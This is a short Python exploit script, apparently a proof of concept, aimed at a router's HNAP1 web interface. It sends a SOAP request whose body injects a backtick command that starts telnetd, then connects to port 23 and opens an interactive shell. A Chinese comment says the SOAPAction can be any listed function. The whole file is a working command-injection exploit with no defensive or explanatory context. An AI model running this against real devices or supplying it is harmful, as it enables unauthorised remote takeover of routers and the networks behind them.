﻿import requests
from pwn import *

IP='192.168.0.1'
command ="'`/bin/telnetd`'"
length = len(command)

headers = requests.utils.default_headers()
headers["Content-Length"]=str(length)
headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
headers["SOAPAction"] = '"http://purenetworks.com/HNAP1/Login"'#此处的Login可以替换为任何在function_list中的函数名
headers["Content-Type"] = "text/xml; charset=UTF-8"
headers["Accept"]="*/*"
headers["Accept-Encoding"]="gzip, deflate"
headers["Accept-Language"]="zh-CN,zh;q=0.9,en;q=0.8"


payload = command
r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload)
print r.text

p=remote(IP,23)
p.interactive()